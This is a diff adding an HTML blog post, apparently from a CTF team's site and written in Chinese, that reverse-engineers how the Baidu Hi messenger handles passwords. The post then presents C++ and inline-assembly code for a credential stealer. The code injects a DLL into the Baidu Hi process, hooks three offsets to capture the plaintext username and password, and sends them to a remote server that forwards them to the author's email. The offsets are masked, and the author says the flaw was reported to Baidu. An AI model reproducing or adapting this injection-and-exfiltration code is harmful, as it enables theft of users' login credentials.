@@ -1,0 +1,308 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>百度Hi安全性探究 | Light 4 Freedom</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="自由之光,Light4Freedom,CTF,L4F">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="百度Hi安全性探究"/>
+  <meta property="og:site_name" content="Light 4 Freedom"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Light 4 Freedom" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Light 4 Freedom</a></h1>
+  <h2><a href="/">Give me liberty or give me death.</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="/atom.xml">RSS</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2014-08-30T12:00:00.000Z"><a href="/2014/08/30/The-Research-About-Baidu-Hi/">Aug 30 2014</a></time>
+      
+      
+  
+    <h1 class="title">百度Hi安全性探究</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>Author: Binary.Kim@Light4Freedom</p>
+<h1 id="缘起">缘起</h1>
+<p>今天天气好，就想分析个软件看看安全性。(・ω・)ノ 然后就随意翻翻，就决定开始分析下百度Hi，并且对它的安全性进行一次分析，并将结果反馈给了百度，最后花了<del>一会儿</del>不止一会儿写了这篇文章。然后自我介绍下，我叫金龟子。大家可以叫我 Binary.Kim 简称「BK」。</p>
+<h1 id="另">另</h1>
+<p>本文为妹子拙作，比较详细，记录了下我分析的过程，不喜勿喷。 ಥ_ಥ<br><a id="more"></a></p>
+<h1 id="密码处理分析流程">密码处理分析流程</h1>
+<p>首先将程序载入 OD 咯，并且 OD 里面下 GetWindowsTextW 的断点。继而发现我每点击一次按键，就会断下来，那么肯定是在 hook了WH_KEYBOARD 消息的消息处理函数中做了处理。</p>
+<p>对 SetWindowsHookExW 函数下断点，可以看到 WH_KEYBOARD 消息钩子的处理函数</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/1.png" alt=""></p>
+<p>并且我发现有一个 while 循环一直在安装钩子。一直安装消息钩子的目的就是保证他自己的消息钩子是处于钩子链的最上面，这样就不会被其他的键盘钩子截获到消息</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/2.png" alt=""></p>
+<p>进钩子消息处理函数里面看看。以下只跟踪密码处理流程。在这个处理函数中，先会判断按键焦点的位置，是不是密码框，如果是密码框就会走密码的处理流程</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/3.png" alt=""></p>
+<p>这里是判断密码是数字还是字母或者是其他的</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/4.png" alt=""></p>
+<p>并且得到输入密码长度</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/5.png" alt=""></p>
+<p>接着发现对密码的第一位进行了 base64 编码</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/6.png" alt=""></p>
+<p>在此我们可以看到加密之后的数据是一个8字节的字符串</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/7.png" alt=""></p>
+<p>之后会将这个8字节字符串进行 base64 解码，解码之后拼接之前输入的密码字符，然后一起用 MD5 加密一次，加密后的数据是一个 MD5 hash 串。（有点记流水账的样子，但是我乐意噻～后面你们就懂什么意思了。） </p>
+<p><img src="/static/The-Research-About-Baidu-Hi/8.png" alt=""></p>
+<p>跟了一下发现，之后也没有把这个消息传给下发。<br>再来看看第密码的第二个字符输入进来之后，首先要对编码后的密码的第一个字符进行解码</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/9.png" alt=""></p>
+<p>解码之后在对当前输入的密码字符进行base64编码，然后编码之后保存起来，再对其进行解码</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/10.png" alt=""><br><img src="/static/The-Research-About-Baidu-Hi/11.png" alt=""></p>
+<p>然后再把这两个东西拼起来 -_,-</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/13.png" alt=""></p>
+<p>这样一直重复，直到最后一个字符都进来，然后就是完整的密码了，然后对这串密码进行 MD5 加密，最后算出一个 MD5Hash</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/14.png" alt=""></p>
+<h1 id="总结分析">总结分析</h1>
+<p>整个流程可以概括为：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">输入密码，算出长度。</div><div class="line">提取密码字符串的一位，此为当前字符，Base64 编码当前字符。</div><div class="line">对前一个字符编码后的字符串进行 Base64 解码。</div><div class="line"> Base64 解码当前字符。</div><div class="line">将解码后的前一个字符和当前字符进行拼接，并且进行 Base64 编码。</div><div class="line">重复2-5的流程直到最后字符都进来，且 Base64 编码过了。</div><div class="line"> Base64 解码最后拼接得到的字符串，并 MD5 加密。</div><div class="line">流程结束</div></pre></td></tr></table></figure>
+
+<p>其实整个流程不难，主要是分析下程序员的思路挺有意思。程序员为了避免将密码明文出现在内存中，蛋疼的进行一次又一次的编码解码拼接，再编码解码拼接balabala……</p>
+<p>但是！</p>
+<p>人生最精彩的就是这个「但是」。<br>他这么操作总会有一步是将密码明文放在内存中的（呵呵），所以假设我是一个怪蜀黍，想偷看我们这些可爱的妹子的密码。我只需要找到一个他 Base64 解码的位置就能将密码偷出来了呢。<br>为了广大女生的安全，我只能模拟一下怪蜀黍的行为，看看是否可行咯～ (￣^￣)ゞ</p>
+<p>在这个 WH_KEYBOARD 的处理流程中，我发现了一个地方，就是下面这个地方。这个地方会直接以明文的方式把用户输入过的密码字符全部显示出来。于是我就想我可以在这里抓取密码。我也是这样做的。我 hook 偏移0x000xxxx4的位置，jmp 到我的函数中，读取密码，然后在执行我抹掉的5字节代码，然后继续往下执行。<br><img src="/static/The-Research-About-Baidu-Hi/15.png" alt=""><br>密码拿到了，用户名就很好拿了。<br> ImEngine.dll 这个 dll 是处理发包收包的库。登陆认证也是在这里面完成的。在这里面我找了两个点，一个点是点击登陆之后会在内存中显示用户名的明文的点，还有一个点是登陆成功之后回去调用的点。我 hook 了这两个地方，其一是为了拿到用户名，其二是为了做登陆是否成功的认证。<br>下面就是我 hook 的得到用户名的点。得到用户名我是直接去 ecx 里面取的值。</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/16.png" alt=""></p>
+<p>用户登陆完成之后会执行下面的这个地方，所以我在这里 hook ，用来判断用户是否成功登陆，成功登陆就以为着这个用户名和密码是可行的。</p>
+<p><img src="/static/The-Research-About-Baidu-Hi/17.png" alt=""></p>
+<p>别的不说，上代码。（说明：只是为了验证是否可行咯，所以代码可定有问题啦，坏人们肯定不能直接拿来用啦～）</p>
+<h1 id="我是有问题的代码">我是有问题的代码</h1>
+<p>首先要注入一个 dll 到百度hi的进程中。注入的代码很好写。首先先将自己的进程提权</p>
+<p>首先先将自己的进程提权</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">HANDLE hToken;</div><div class="line">BOOL f0k = TRUE;</div><div class="line"><span class="keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKENS_ADJUST_PRIVILEGES, &hToken))</div><div class="line">{</div><div class="line">	TOKEN_PRIVILEGES tp;</div><div class="line">	tp.PrivilegeCount = <span class="number">1</span>;</div><div class="line">	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[<span class="number">0</span>].Luid);</div><div class="line">	tp.Privilege[<span class="number">0</span>].Attributes = SE_PRIVILEGE_DISABLED;</div><div class="line"></div><div class="line">	AdjustTokenPrivileges(hToken, FALSE, &tp, <span class="keyword">sizeof</span>(tp), NULL, NULL)</div><div class="line"></div><div class="line">	f0k = (GetLastError() == ERROR_SUCCESS);</div><div class="line">	CloseHandle(hToken);</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>然后遍历系统里面是否有百度hi的进程</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//给系统进程拍个快照 （跟我喊：茄子</span></div><div class="line">HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (hProcessSnap == INVAILD_HANDLE_VALUE)</div><div class="line">{</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">}</div><div class="line"><span class="comment">//现在开始遍历快照</span></div><div class="line"><span class="keyword">while</span>(Ret)</div><div class="line">{</div><div class="line">	<span class="keyword">if</span> (wcsicmp(pe32.szExeFile, ch) == <span class="number">0</span>)</div><div class="line">	{</div><div class="line">		p_id = pe32.th32ProcessID;</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	}</div><div class="line"></div><div class="line">	Ret = Process32Next(hProcessSnap, &pe32);  <span class="comment">//尼玛啊，忘记写这儿，卡了一下午。</span></div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>然后打开百度Hi进程</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">FALSE</span>, p_id);</div><div class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>)</div><div class="line">{</div><div class="line">	printf(<span class="string">"OpenProcess failed\n"</span>);</div><div class="line">	HLOCAL hlocal = <span class="literal">NULL</span>;</div><div class="line">	DWORD systemLocale = MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);</div><div class="line">	DWORD <span class="keyword">error</span> = GetLastError();</div><div class="line">	DWORD Message = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS</div><div class="line">				     |FORMAT_MESSAGE_ALLOCATE_BUFFER, <span class="literal">NULL</span>, <span class="keyword">error</span>, systemLocale, (PTSTR)&hlocal, <span class="number">0</span> );</div><div class="line">	MessageBoxW(<span class="literal">NULL</span>, (LPCWSTR)LocalLock(hlocal), (LPCWSTR)<span class="string">"error"</span>, <span class="number">0</span>);</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>然后在远程进程中分配空间，并且注入dll进去</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//在远程进程中分配空间</span></div><div class="line">LPVOID newBuffer = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(strDll)+<span class="number">1</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line"><span class="keyword">if</span> (newBuffer == <span class="literal">NULL</span>)</div><div class="line">{</div><div class="line">	DWORD systemLocale = MAKELANGID(LANG_NEUTRAL,SUBLANG_NEUTRAL);</div><div class="line">	DWORD error = GetLastError();</div><div class="line">	DWORD Message = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS</div><div class="line">		|FORMAT_MESSAGE_ALLOCATE_BUFFER, <span class="literal">NULL</span>, error, systemLocale, (PTSTR)&hlocal, <span class="number">0</span>);</div><div class="line">	MessageBoxW(<span class="literal">NULL</span>,(LPCWSTR)LocalLock(hlocal),(LPCWSTR)<span class="string">"error"</span>,<span class="number">0</span>);</div><div class="line">	printf(<span class="string">"virtualAllocEx failed\n"</span>);</div><div class="line">}</div><div class="line"><span class="comment">//加载dll路径到远程进程中</span></div><div class="line"><span class="built_in">BOOL</span> bRet = WriteProcessMemory(hProcess, newBuffer, (LPCWSTR)pUnicode,<span class="keyword">sizeof</span>(strDll)+<span class="number">1</span>,<span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (!bRet)</div><div class="line">{</div><div class="line">	printf(<span class="string">"writeProcessMemory failed\n"</span>);</div><div class="line">}</div><div class="line"><span class="comment">//启动远程线程</span></div><div class="line">hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryW, newBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (hRemoteThread == INVALID_HANDLE_VALUE)</div><div class="line">{</div><div class="line">	printf(<span class="string">"CreateRemoteThread failed\n"</span>);</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>5、Dll部分的编写<br>DllMain函数中很简单的开了两个线程。唔。我没有写等待线程退出的操作</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (DLL_PROCESS_ATTACH == ul_reason_for_call)</div><div class="line">{</div><div class="line">	CreateThread(<span class="keyword">NULL</span>, <span class="number">0</span>, ThreadMain, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);		</div><div class="line">	CreateThread(<span class="keyword">NULL</span>, <span class="number">0</span>, ThreadMainTwo, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>第一个线程中获取用户名和密码，经过上面的分析，我一共要hook三个地方，第一个地方是偏移0x000xxxx4的地方，为了得到密码。。第二个是偏移0x000xxxxD为了得到用户名，第三个是0x000xxxxF为了得到用户登录成功的标志。（原谅我屎一样的代码 ಥ_ಥ ）</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">//线程函数</div><div class="line">DWORD _stdcall ThreadMain(LPVOID)</div><div class="line">{</div><div class="line">	//获得主程序的基址和ImEngine的基址</div><div class="line">	baseAddress = GetModuleHandle(NULL);</div><div class="line">	baseAddressTwo = GetModuleHandleA(<span class="string">"ImEngine.dll"</span>);</div><div class="line">	//构造返回地址</div><div class="line">	retAddress = (DWORD)baseAddress + 0x000xxxx9;</div><div class="line">	retAddressTwo = (DWORD)baseAddressTwo + 0x000xxxx3;</div><div class="line">	retAddressThree = (DWORD)baseAddressTwo + 0x000xxx5;</div><div class="line">	//OutputDebugString((LPCWSTR)baseAddressTwo);</div><div class="line">	//得到要hook的点的地址</div><div class="line">	DWORD* hookPointOne = (DWORD*)((DWORD)baseAddress + 0x000xxxx4);</div><div class="line">	DWORD* hookPointTwo = (DWORD*)((DWORD)baseAddressTwo + 0x000xxxxD);</div><div class="line">	DWORD* hookPointThree = (DWORD*)((DWORD)baseAddressTwo+0x000xxxxF);</div><div class="line">	//转换我的hook proc函数</div><div class="line">	DWORD* hookProc = (DWORD*)myProcess;</div><div class="line">	DWORD* hookProcTwo = (DWORD*)myProcessTwo;</div><div class="line">	DWORD* hookProcThree = (DWORD*)myProcessThree;</div><div class="line">	//进行hook</div><div class="line">	hook(hookPointOne,hookProc);</div><div class="line">	hookTwo(hookPointTwo,hookProcTwo);</div><div class="line">	hookThree(hookPointThree,hookProcThree);</div><div class="line">	</div><div class="line">	return TRUE;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>Hook函数其实很简单，就是inline hook刚刚那些偏移。有些地方要hook 5字节，有些地方要hook 6字节。所以我很图方便的写了三个hook 函数。唔。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">void hook(DWORD* hookPoint, DWORD* hookProc)</div><div class="line">{</div><div class="line">	DWORD dwNum = 0;</div><div class="line">	HLOCAL hlocal = NULL;</div><div class="line">	DWORD systemLocale = MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL);</div><div class="line">	DWORD oldProtect = NULL;</div><div class="line">	BOOL ret = VirtualProtect((LPVOID)hookPoint, sizeof(DWORD)*2, PAGE_READWRITE, &oldProtect);</div><div class="line">	if(ret == FALSE)</div><div class="line">	{</div><div class="line">		DWORD error = GetLastError();</div><div class="line">		DWORD Message = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS</div><div class="line">			|FORMAT_MESSAGE_ALLOCATE_BUFFER, NULL, error, systemLocale, (PTSTR)&hlocal, 0);</div><div class="line">		MessageBoxW(NULL,(LPCWSTR)LocalLock(hlocal), (LPCWSTR)<span class="string">"error"</span>, 0);</div><div class="line">	}</div><div class="line">	//保存该地址处5字节的内容</div><div class="line">	for (int j = 0; j &lt; 5; j++)</div><div class="line">	{</div><div class="line">		m_bOldBytes[j] =(BYTE) *(hookPoint + j);</div><div class="line">	}</div><div class="line">	//构造JMP指令</div><div class="line">	m_bInlineBytes[0] = '\xe9';</div><div class="line">	//5是指令长度</div><div class="line">	*(DWORD*)(m_bInlineBytes + 1) = (DWORD)hookProc - (DWORD)hookPoint- 5;</div><div class="line">	//将构造好的地址写入该函数</div><div class="line">	WriteProcessMemory(GetCurrentProcess(), hookPoint, m_bInlineBytes, 5, &dwNum);</div><div class="line">	</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>Hook了之后，当程序执行到那些指定的位置的时候，就会跳去执行我的代码。我的第一个hook proc函数，就是获取密码,到堆栈中去获取密码。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">__declspec(naked) void myProcess()</div><div class="line">{</div><div class="line">	__asm{</div><div class="line">		mov tempAddsress,esp</div><div class="line">		pushad</div><div class="line">	}</div><div class="line">	address = tempAddsress + 0x01;</div><div class="line">	for (int i = 0; i &lt;14; i++)</div><div class="line">	{</div><div class="line">		if (*(*address+i) == 0x00)</div><div class="line">		{</div><div class="line">			break;</div><div class="line">		}</div><div class="line">		else</div><div class="line">		{</div><div class="line">			password[i] = *(*address+i);</div><div class="line">		}</div><div class="line">	}</div><div class="line">	//addressC = address - 0xC;</div><div class="line">	//hookPointFlag = TRUE;</div><div class="line">	__asm{</div><div class="line">		</div><div class="line">		popad</div><div class="line">		//popfd</div><div class="line">		mov eax,dword ptr ss:[ebp+0x8]</div><div class="line">		mov ecx,dword ptr ds:[eax]</div><div class="line">		jmp retAddress;</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>第二个hook porc是获取用户名</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">__declspec(naked) void myProcessTwo()</div><div class="line">{</div><div class="line">	__asm{</div><div class="line">		pushad</div><div class="line">		mov addressTwo,ecx</div><div class="line">	}</div><div class="line"></div><div class="line">	//wcsncpy(username,addressTwo,sizeof(addressTwo));</div><div class="line">	for (int i = 0;i&lt;128;i++)</div><div class="line">	{</div><div class="line">		if (*(addressTwo+i) == NULL)</div><div class="line">		{</div><div class="line">			break;</div><div class="line">		}</div><div class="line">		else{</div><div class="line">			username[i] = *(addressTwo+i);</div><div class="line">		}</div><div class="line">	}</div><div class="line">	//hookPointFlag = TRUE;</div><div class="line">	__asm{</div><div class="line">		popad</div><div class="line">		push dword ptr ss:[ebp+0x10]</div><div class="line">		lea ecx,dword ptr ss:[ebp-0x18]</div><div class="line">		jmp retAddressTwo;</div><div class="line">	}</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>第三个是获取登陆成功的标志</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">__declspec(naked) void myProcessThree()</div><div class="line">{</div><div class="line">	__asm{</div><div class="line">		<span class="keyword">pushad</span></div><div class="line">	}</div><div class="line">	hookPointFlag = TRUE<span class="comment">;</span></div><div class="line">	__asm</div><div class="line">	{</div><div class="line">		<span class="keyword">popad</span></div><div class="line">		<span class="keyword">lea</span> <span class="number">eax</span>,<span class="preprocessor">dword</span> <span class="preprocessor">ptr</span> <span class="literal">ss</span>:[<span class="literal">ebp</span>-<span class="number">0x24</span>]</div><div class="line">		<span class="keyword">push</span> <span class="number">eax</span></div><div class="line">		<span class="keyword">push</span> <span class="number">0x20</span></div><div class="line">		<span class="keyword">jmp</span> retAddressThree</div><div class="line">	}</div><div class="line"></div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>最后，第二个线程函数里面检测是否登陆成功。如果登陆成功，那么就发数据到我的服务器。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">DWORD _stdcall ThreadMainTwo(LPVOID)</div><div class="line">{</div><div class="line">	while(TRUE){</div><div class="line">		Sleep(500);</div><div class="line">		if (hookPointFlag == TRUE)</div><div class="line">		{</div><div class="line">			//把username转换成多字节</div><div class="line">			int len = WideCharToMultiByte(CP_ACP,0,username,sizeof(username),NULL,0,NULL,NULL);</div><div class="line">			 WideCharToMultiByte(CP_ACP,0,username,sizeof(username),pFileName,len,NULL,NULL);</div><div class="line">			 sprintf(body,<span class="string">"{\"from\":\"asdf@qq.com\",\"to\":\"123@qq.com\",\"content\":\"username:%s,password:%s\",\"password\":\"password\",\"username\":\"username\"}"</span>,pFileName,password);</div><div class="line">			 WORD wVersionRequested;</div><div class="line">			 WSADATA wsaData;//这个结构体用于返回套接字库的信息</div><div class="line">			 int err;</div><div class="line">			 wVersionRequested = MAKEWORD(2,2);//我们加载的是1.1的套接字库</div><div class="line">			 err = WSAStartup(wVersionRequested, &wsaData);</div><div class="line">			 if (err != 0)</div><div class="line">			 {</div><div class="line">				return 0;</div><div class="line">			 }</div><div class="line">			 if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wHighVersion) != 2)</div><div class="line">			 {</div><div class="line">				 return 0;</div><div class="line">			 }</div><div class="line">			 //第二步创建套接字</div><div class="line">			 SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);</div><div class="line">			 //第三步，向服务器发出连接请求</div><div class="line">			 SOCKADDR_IN addrSrv;</div><div class="line">			 addrSrv.sin_addr.S_un.S_addr = inet_addr(<span class="string">"127.0.0.1"</span>);//设置服务器端的IP地址</div><div class="line">			 addrSrv.sin_family = AF_INET;</div><div class="line">			 addrSrv.sin_port = htons(8889);</div><div class="line">			 //进行连接</div><div class="line">			 connect(sockClient, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));</div><div class="line">			 //第四步，和服务器进行通信</div><div class="line">			 //char recvBuf[100];</div><div class="line">			// recv(sockClient, recvBuf, 100, 0);</div><div class="line">			// printf(<span class="string">"%s\n"</span>, recvBuf);</div><div class="line">			 send(sockClient, body, strlen(body)+1, 0);</div><div class="line"></div><div class="line">			 //关闭套接字</div><div class="line">			 closesocket(sockClient);</div><div class="line">			 WSACleanup();</div><div class="line"></div><div class="line">			 //发邮件</div><div class="line">			//SendMail(email,body);</div><div class="line">			//delete pFileName;</div><div class="line">			//delete email;</div><div class="line">			break;</div><div class="line">		}</div><div class="line">	}</div><div class="line">	return TRUE;</div><div class="line">}</div></pre></td></tr></table></figure>
+
+<p>服务器上跑着一个py的脚本。收到这个json格式的信息之后，就往我的邮箱里面发东西啦。<br>BTW，我只测试过 百度Hi 4.5 Beta版（4.5.0.2），其他版本不知道可不可行。因为我写的是硬偏移，所以估计不行。<br>C:\Users\balabala\Documents\Baidu\Baidu Hi 文件夹下的login.dat，定时删除。再完善就是稳定性和隐蔽性了。。唔。结束。</p>
+<h1 id="再BTW">再BTW</h1>
+<p>cbuteng是bk的固有领土！你们不许调戏我妹子。</p>
+<h1 id="某人打个广告">某人打个广告</h1>
+<p>有想成为或者已经成为「赛棍」的盆友们，如果想加入L4F一起打ctf欢迎 mail: new(at)l4f.club 。并带上你打ctf的经历，还有你的技术方向。等一系列证明你自己的东西，l4f欢迎各位小伙伴。(￣▽￣)</p>
+<p><em>转载请在文章前注明出处 <a href="http://l4f.club" target="_blank" rel="external">http://l4f.club</a></em></p>
+
+      
+    </div>
+    <footer>
+      
+        
+  
+  <div class="categories">
+    <a href="/categories/Binary/">Binary</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/百度Hi/">百度Hi</a>, <a href="/tags/逆向/">逆向</a>
+  </div>
+
+        <!--
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+-->
+        <div class="bdsharebuttonbox"><a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a><a href="#" class="bds_renren" data-cmd="renren" title="分享到人人网"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a></div>
